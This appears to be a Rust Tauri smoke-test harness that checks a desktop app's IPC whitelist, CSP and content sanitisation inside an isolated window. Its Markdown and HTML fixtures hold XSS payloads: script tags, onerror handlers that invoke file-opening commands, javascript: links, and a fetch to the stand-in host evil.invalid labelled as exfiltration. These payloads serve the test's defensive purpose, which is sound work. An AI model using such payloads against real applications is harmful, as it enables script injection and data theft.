// nayan-asset-smoke —— 实际 Tauri 框架资源/IPC 传输测试（P1-B06-FIVE-STEP-2026-10-01 Step5）
//
// 【定位与边界（如实声明）】
// - 证明：真实 tauri::generate_context! 构建资源流程 + WebviewUrl::App 自定义协议服务
//   （产品 app/ui 只读副本，逐文件 SHA-256 manifest 由驱动 run.mjs 生成）+ 真实 Tauri
//   IPC（页面 __TAURI__.core.invoke → 本 crate 注册的 Rust handler，无任何 JS 桩/桩 TAPI）。
// - 不证明：完整 NaYan 生产整链（生产 handle_api/handle_command 的业务等价性）。本程序
//   的 api/own_icon/app_icon handler 返回合成 fixture，与产品 handle_api 的区别已在
//   报告明示。CSP/nonce 为真实 Tauri 构建期注入+服务期替换（非手工补）。
// - 隔离（入口设计先于运行）：独立 identifier com.nayan.assetsmoke.test；窗口经
//   incognito(true)（wry → WKWebsiteDataStore::nonPersistentDataStore，已核 wry 源码）；
//   不注册热键/剪贴板/单实例/自启/AX/通知/外部 open 插件或 handler；不加载 NaYan 生产
//   配置/数据库；结果只写入 SMOKE_RESULT_DIR 指定的本次临时根。
// - 门控（失败绝不 exit 0）：超时 4 / 结果写失败或解析失败 5 / clean 模式出现违规 6 /
//   gate-cmd 抓住 7（未抓住=观察器缺陷 9）/ gate-net 抓住 8（未抓住 9）。
//
// 运行：由 run.mjs 驱动（先复制 app/ui → dist-ui 再 cargo build --offline）。
// 环境变量：SMOKE_MODE=clean|gate-cmd|gate-net，SMOKE_RESULT_DIR=<临时根>。

#![allow(clippy::needless_pass_by_value)]

use serde_json::{json, Value};
use std::sync::Mutex;
use std::time::Instant;
use tauri::{Manager, State, WebviewUrl, WebviewWindowBuilder};
use tauri::ipc::InvokeBody;

const SMALLEST_ICON_DATAURI: &str = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAAAdnPAfAAAAX0lEQVR4nGPQsIn6L6fjhhPTWp5hIC0HyeN0AL1CBqsD6BktGA6gd5pgGEjLURwwULmBYSAtBztgtBwYSMtxhsBoOUDPaBktB0bLgdFyYLQcGC0HRsuB0XJgtBwYLQcAyUZTW/ywupkAAAAASUVORPArHVk=";

struct SmokeState {
    started: Instant,
    rust_log: Mutex<Vec<Value>>,      // Application IPC ingress; plugin ACL is observed at real JS transport.
    unauthorized_probes: Mutex<Vec<Value>>, // 到达 Rust 的未授权探针（记录后拒绝）
    phase: Mutex<String>,
    done: Mutex<bool>,
}

fn rec(state: &State<SmokeState>, cmd: &str, extra: Value) {
    let ts = state.started.elapsed().as_millis() as u64;
    let mut e = json!({ "tsMs": ts, "cmd": cmd });
    if let Some(obj) = extra.as_object() {
        for (k, v) in obj {
            e[k.as_str()] = v.clone();
        }
    }
    if let (Ok(phase), Ok(mut l)) = (state.phase.lock(), state.rust_log.lock()) {
        e["phase"] = json!(phase.clone());
        e["run"] = json!(std::env::var("SMOKE_RUN").unwrap_or_default());
        e["seq"] = json!(l.len() + 1);
        l.push(e);
    }
}

// ---------- 合成 fixture（与 WKWebView 探针同源；敌意载荷含 TAPI 企图/网络企图/javascript:） ----------
const HOSTILE_MD: &str = "# 敌意甲\n<script>window.__PWNED__=1</script>\n<img src=x onerror=\"window.__PWNED_IMG__=1;TAPI.invoke('open_path',{path:'/private/tmp/pwn-md'})\">\n<span style=\"color:red\">styled</span>\n![r](https://evil.invalid/x.png)\n<img src=y onerror=\"fetch('https://evil.invalid/md-exfil')\">\n[危险链接](javascript:TAPI.invoke('delete_everything',{}))\n\n```\ncode 原文 · Unicode ✓\n  缩进保留\tTab\n```\n\n正文尾";
const HOSTILE_HTML: &str = "<p>声明 HTML 条目</p><strong>白名单标签保留</strong><script>window.__PWNED_HTML__=1</script><img src=\"https://evil.invalid/html.png\" onerror=\"TAPI.invoke('open_path',{path:'/private/tmp/pwn-html'})\"><span style=\"color:red\" onclick=\"TAPI.invoke('open_path',{path:'/private/tmp/pwn-click'})\">styled</span><a href=\"javascript:TAPI.invoke('delete_all\',{})\">危险链接</a><a href=\"https://example.com/ok\">安全外链</a><iframe src=\"https://evil.invalid/frame\"></iframe>";

fn suggestions_fixture() -> Value {
    json!([
        { "id": 1, "title": "合成条目甲", "quote": "合成正文一行", "status": "inbox", "kind": "suggestion",
          "source_tool": "probe-tool-a", "workspace": "/w/alpha", "session_ref": "窗口：A", "window_id": 7, "created_at": "2026-10-01 09:00:00" },
        { "id": 2, "title": "合成条目乙", "quote": "合成正文二行", "status": "inbox", "kind": "suggestion",
          "source_tool": "probe-tool-b", "workspace": "", "session_ref": "", "window_id": 0, "created_at": "2026-10-01 09:01:00" },
        { "id": 3, "title": "敌意条目(MD)", "status": "inbox", "kind": "suggestion",
          "source_tool": "probe-tool-a", "workspace": "", "session_ref": "", "window_id": 0, "created_at": "2026-10-01 09:02:00" },
        { "id": 4, "title": "无图标条目", "quote": "无图标正文", "status": "inbox", "kind": "suggestion",
          "source_tool": "probe-tool-empty", "workspace": "", "session_ref": "", "window_id": 0, "created_at": "2026-10-01 09:03:00" },
        { "id": 5, "title": "敌意条目(HTML)", "status": "inbox", "kind": "suggestion",
          "source_tool": "probe-tool-a", "workspace": "", "session_ref": "", "window_id": 0, "created_at": "2026-10-01 09:04:00" }
    ])
}

fn envelope_fixture(fmt: &str, request_id: &str, canonical: &str) -> Value {
    json!({
        "schema_version": 1, "request_id": request_id, "format": fmt,
        "format_provenance": "declared", "acquisition": "manual",
        "original": { "kind": "text", "text": canonical }, "fidelity": { "truncated": false },
        "canonical": canonical, "canonical_unavailable_reason": null,
        "plain_projection": { "status": "available", "text": "" }
    })
}

// ---------- IPC handler（全部真实 IPC 到达；api 与产品 handle_api 的差异：合成 fixture、无 SQLite） ----------
#[tauri::command]
fn js_log(_state: State<SmokeState>, msg: String) { let _ = msg; }

#[tauri::command]
fn own_icon(_state: State<SmokeState>) -> String {
    SMALLEST_ICON_DATAURI.to_string()
}

#[tauri::command]
fn app_icon(_state: State<SmokeState>, name: Option<String>) -> String {
    if name.as_deref() == Some("probe-tool-empty") {
        String::new()
    } else {
        SMALLEST_ICON_DATAURI.to_string()
    }
}

#[tauri::command]
fn api(_state: State<SmokeState>, method: Option<String>, path: Option<String>) -> Result<Value, String> {
    let m = method.unwrap_or_else(|| "GET".into());
    let p = path.unwrap_or_default();
    // 白名单（Rust 侧同样只放行读取端点；写操作显式拒绝——与 JS 观察器口径互证）
    if !authz_rust("api", Some(&m), Some(&p)) {
        return Err(format!("asset-smoke 仅服务 GET fixture：拒绝 {}", m));
    }
    if p == "/api/suggestions" {
        return Ok(suggestions_fixture());
    }
    if p == "/api/projects" {
        return Ok(json!([]));
    }
    if p == "/api/session-aliases" {
        return Ok(json!([]));
    }
    if p == "/api/suggestions/3/content" {
        return Ok(json!({ "content": envelope_fixture("markdown", "probe-md", HOSTILE_MD), "quote": "" }));
    }
    if p == "/api/suggestions/5/content" {
        return Ok(json!({ "content": envelope_fixture("html", "probe-html", HOSTILE_HTML), "quote": "" }));
    }
    if let Some(id) = p.strip_prefix("/api/suggestions/").and_then(|rest| rest.split('/').next()).filter(|s| !s.is_empty() && s.chars().all(|c| c.is_ascii_digit())) {
        // 其他条目 content：legacy plain（quote 渲染路径）
        let _ = id;
        return Ok(Value::Null);
    }
    Err(format!("asset-smoke 未实现该 fixture 端点：{}", p))
}

#[tauri::command]
fn smoke_phase(state: State<SmokeState>, name: String) {
    if let Ok(mut ph) = state.phase.lock() {
        *ph = name.clone();
    }
}

/// 模拟未授权/特权命令：请求经真实 IPC 到达这里——【记录后拒绝】（本 crate 不注册
/// 任何执行外部操作的能力，此 handler 是唯一「特权样貌」入口，永远返回 Err）。
#[tauri::command]
fn smoke_unauthorized_probe(state: State<SmokeState>, marker: Option<String>) -> Result<(), String> {
    let entry = json!({ "tsMs": state.started.elapsed().as_millis() as u64, "marker": marker.unwrap_or_default() });
    if let Ok(mut l) = state.unauthorized_probes.lock() {
        l.push(entry);
    }
    Err("unauthorized command probe: recorded and rejected".into())
}

// Rust 侧白名单（原生调用权威判定；与 fixture 端点口径一致）：
// 图标/日志/测试通道任意阶段放行；api 仅 GET 且仅列名端点；其余（含
// smoke_unauthorized_probe / 写操作 / 未知命令）一律未授权。
fn authz_rust(cmd: &str, method: Option<&str>, path: Option<&str>) -> bool {
    match cmd {
        "js_log" | "own_icon" | "app_icon" | "smoke_phase" | "smoke_result" => true,
        "api" => {
            if method != Some("GET") { return false; }
            let p = path.unwrap_or("");
            matches!(p, "/api/suggestions" | "/api/projects" | "/api/session-aliases")
                || valid_item_read(p)
        }
        _ => false,
    }
}

fn valid_item_read(path: &str) -> bool {
    let parts: Vec<_> = path.split('/').collect();
    parts.len() == 5 && parts[0].is_empty() && parts[1] == "api" && parts[2] == "suggestions"
        && parts[3].parse::<u64>().map(|id| id > 0 && id <= 9_007_199_254_740_991 && id.to_string() == parts[3]).unwrap_or(false)
        && matches!(parts[4], "content" | "attachments")
}

// rustLog 按 smoke_phase 标记分桶；返回 hostile-window 桶内的未授权条目
fn hostile_window_unauthorized(log: &[Value]) -> Vec<Value> {
    let mut in_hostile = false;
    let mut out = Vec::new();
    for e in log {
        let cmd = e["cmd"].as_str().unwrap_or("");
        if cmd == "smoke_phase" {
            // smoke_phase 命令自身的 rec.phase 已是新阶段名（rec 在 phase 赋值后记录）
            in_hostile = e["name"].as_str() == Some("hostile-window");
            continue;
        }
        if in_hostile {
            let ok = authz_rust(
                cmd,
                e.get("method").and_then(|m| m.as_str()),
                e.get("path").and_then(|p| p.as_str()),
            );
            if !ok { out.push(e.clone()); }
        }
    }
    out
}

#[tauri::command]
fn smoke_result(state: State<SmokeState>, app: tauri::AppHandle, payload: String) -> Result<(), String> {
    let mode = std::env::var("SMOKE_MODE").unwrap_or_else(|_| "clean".into());
    let dir = std::env::var("SMOKE_RESULT_DIR").unwrap_or_else(|_| ".".into());
    let js: Value = serde_json::from_str(&payload).map_err(|e| format!("js payload 解析失败：{}", e))?;

    let hostile = js.get("hostileSealed").cloned().unwrap_or(Value::Null);
    let js_external = hostile.get("external").and_then(|v| v.as_array()).map(|a| a.len()).unwrap_or(usize::MAX);
    let rust_probes = state.unauthorized_probes.lock().map(|l| l.len()).unwrap_or(0);
    let log_snapshot = state.rust_log.lock().map(|l| l.clone()).unwrap_or_default();
    let hostile_unauth = hostile_window_unauthorized(&log_snapshot);
    let hostile_unauth_cmds: Vec<String> = hostile_unauth.iter().map(|e| e["cmd"].as_str().unwrap_or("?").to_string()).collect();

    let (gate, code) = if js.get("driverError").is_some() || js["pageReady"] != true
        || !js["hostileSealed"]["external"].is_array() || !js["violations"].is_array() {
        ("PAGE-FAIL (invalid/incomplete observer result)".to_string(), 5)
    } else { match mode.as_str() {
        "clean" => {
            if hostile_unauth.is_empty() && js_external == 0 && rust_probes == 0
                && js["violations"].as_array().map(|a| a.is_empty()).unwrap_or(false) {
                ("PASS（敌意窗口分桶零未授权原生调用 / JS 零外部尝试 / Rust 零探针）".to_string(), 0)
            } else {
                (format!("GATE-FAIL（rust 敌意窗口未授权={:?} js_external={} rust_probes={}）", hostile_unauth_cmds, js_external, rust_probes), 6)
            }
        }
        "gate-cmd" => {
            if rust_probes >= 1 && hostile_unauth.iter().any(|e| e["cmd"] == "smoke_unauthorized_probe") {
                ("GATE-FAIL-AS-DESIGNED（未授权命令经真实 IPC 到达 Rust 被记录并拒绝；敌意窗口分桶抓住）".to_string(), 7)
            } else {
                (format!("OBSERVER-BROKEN（rust_probes={} bucket={:?}——注入未被记录）", rust_probes, hostile_unauth_cmds), 9)
            }
        }
        "gate-unknown" | "gate-path" | "gate-write" => {
            if !hostile_unauth.is_empty() {
                ("GATE-FAIL-AS-DESIGNED (actual attempted command recorded before dispatch)".into(), 7)
            } else { ("OBSERVER-BROKEN (no unauthorized application ingress)".into(), 9) }
        }
        "gate-plugin" => {
            if js["hostileIpc"].as_array().map(|a| a.iter().any(|e| e["cmd"] == "plugin:nayan_absent|probe")).unwrap_or(false) {
                ("GATE-FAIL-AS-DESIGNED (plugin ACL rejection observed at actual IPC transport)".into(), 7)
            } else { ("OBSERVER-BROKEN (plugin attempt missing)".into(), 9) }
        }
        "gate-csp" => {
            if js["violations"].as_array().map(|a| !a.is_empty()).unwrap_or(false) {
                ("GATE-FAIL-AS-DESIGNED (non-control CSP violation)".into(), 10)
            } else { ("OBSERVER-BROKEN (CSP attempt missing)".into(), 9) }
        }
        "observer-controls" => ("Isolated observer positive controls (not clean evidence)".into(), 0),
        "gate-net" => {
            if js_external >= 2 {
                ("GATE-FAIL-AS-DESIGNED（瞬时外部 img+fetch 尝试均留痕，含已移除节点）".to_string(), 8)
            } else {
                (format!("OBSERVER-BROKEN（js_external={}——瞬时尝试未全部留痕）", js_external), 9)
            }
        }
        other => (format!("未知模式 {}", other), 5),
    }};

    let out = json!({
        "mode": mode,
        "gate": { "result": gate, "exitCode": code, "jsExternal": js_external, "rustUnauthorizedProbes": rust_probes,
                  "hostileWindowUnauthorized": hostile_unauth,
                  "nativeRecordingNote": "实际 fetch IPC 尝试（含 plugin ACL）+ Rust application ingress before dispatch；fallback 未覆盖时门控失败" },
        "rustLog": *state.rust_log.lock().map_err(|e| e.to_string())?,
        "rustPhases": *state.rust_log.lock().map_err(|e| e.to_string())?
            .iter().filter(|e| e["cmd"] == "smoke_phase").map(|e| { let mut e=e.clone(); e["phase"]=e["name"].clone(); e }).collect::<Vec<_>>().into_iter().collect::<Vec<_>>(),
        "jsResult": js,
    });
    let path = std::path::Path::new(&dir).join(format!("asset-smoke-{}.json", mode));
    std::fs::write(&path, serde_json::to_string_pretty(&out).map_err(|e| e.to_string())?)
        .map_err(|e| format!("结果写失败 {:?}: {}", path, e))?;
    eprintln!("[asset-smoke] result written: {:?} gate={}", path, gate);
    if let Ok(mut d) = state.done.lock() {
        *d = true;
    }
    // 退出交由主线程 watchdog/Finish 处理；此处唤醒
    std::thread::spawn(move || {
        std::thread::sleep(std::time::Duration::from_millis(200));
        let _ = app; // 保持句柄活到写出
        std::process::exit(code as i32);
    });
    Ok(())
}

fn main() {
    let mode = std::env::var("SMOKE_MODE").unwrap_or_else(|_| "clean".into());
    let result_dir = std::env::var("SMOKE_RESULT_DIR").unwrap_or_else(|_| ".".into());
    eprintln!("[asset-smoke] mode={} result_dir={}", mode, result_dir);

    tauri::Builder::default()
        .setup(move |app| {
            let state = SmokeState {
                started: Instant::now(),
                rust_log: Mutex::new(Vec::new()),
                unauthorized_probes: Mutex::new(Vec::new()),
                phase: Mutex::new("pre-init".into()),
                done: Mutex::new(false),
            };
            app.manage(state);

            let obs = include_str!("../observer.js").replace("__SMOKE_MODE__", &mode);
            let win = WebviewWindowBuilder::new(app, "smoke-main", WebviewUrl::App("index.html".into()))
                .title("nayan-asset-smoke（隔离测试窗）")
                .inner_size(1280.0, 800.0)
                .focused(false)
                .initialization_script(obs)
                .incognito(true) // wry → WKWebsiteDataStore::nonPersistentDataStore（非持久隔离）
                .build()?;
            let _ = win; // Do not activate or steal focus from the user.

            // 看门狗：90s 内没有 smoke_result → 落盘取证（rustLog+阶段）后非零退出
            let handle: tauri::AppHandle = app.handle().clone();
            std::thread::spawn(move || {
                std::thread::sleep(std::time::Duration::from_secs(90));
                let dir = std::env::var("SMOKE_RESULT_DIR").unwrap_or_else(|_| ".".into());
                let mode = std::env::var("SMOKE_MODE").unwrap_or_else(|_| "clean".into());
                if let Some(st) = handle.try_state::<SmokeState>() {
                    let out = json!({
                        "mode": mode,
                        "gate": { "result": "TIMEOUT（90s 未收到 smoke_result；页面未完成驱动——取证转储）", "exitCode": 4 },
                        "rustLog": st.rust_log.lock().map(|l| l.clone()).unwrap_or_default(),
                    });
                    let path = std::path::Path::new(&dir).join(format!("asset-smoke-{}.json", mode));
                    if let Ok(txt) = serde_json::to_string_pretty(&out) { let _ = std::fs::write(&path, txt); }
                }
                eprintln!("[asset-smoke] TIMEOUT：90s 未收到 smoke_result（rustLog 已转储）");
                std::process::exit(4);
            });
            Ok(())
        })
        .invoke_handler(|invoke| {
            let cmd = invoke.message.command().to_owned();
            let st = invoke.message.webview_ref().state::<SmokeState>();
            let mut fields = json!({ "recordingLayer": "application-ingress-before-dispatch" });
            if let InvokeBody::Json(payload) = invoke.message.payload() {
                for key in ["method", "path", "name", "msg", "marker"] {
                    if let Some(v) = payload.get(key) { fields[key] = v.clone(); }
                }
            }
            rec(&st, &cmd, fields);
            // False is left to Tauri's genuine unknown-command rejection, after recording.
            let dispatch: fn(tauri::ipc::Invoke<tauri::Wry>) -> bool = tauri::generate_handler![js_log, own_icon, app_icon, api, smoke_phase, smoke_unauthorized_probe, smoke_result];
            dispatch(invoke)
        })
        .run(tauri::generate_context!())
        .expect("asset-smoke 运行失败");
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn exact_read_whitelist() {
        for p in ["/api/suggestions", "/api/projects", "/api/session-aliases", "/api/suggestions/3/content", "/api/suggestions/5/attachments"] {
            assert!(authz_rust("api", Some("GET"), Some(p)), "{}", p);
        }
        for p in ["/api/suggestions//content", "/api/suggestions/0/content", "/api/suggestions/01/content", "/api/suggestions/not-an-id/extra/content", "/api/suggestions/3/extra/content", "/api/suggestions/3/content?x", "/api/suggestions/9007199254740992/content"] {
            assert!(!authz_rust("api", Some("GET"), Some(p)), "{}", p);
        }
        assert!(!authz_rust("api", Some("PATCH"), Some("/api/suggestions/3/content")));
        assert!(!authz_rust("open_path", None, None));
        assert!(!authz_rust("plugin:nayan_absent|probe", None, None));
    }
}
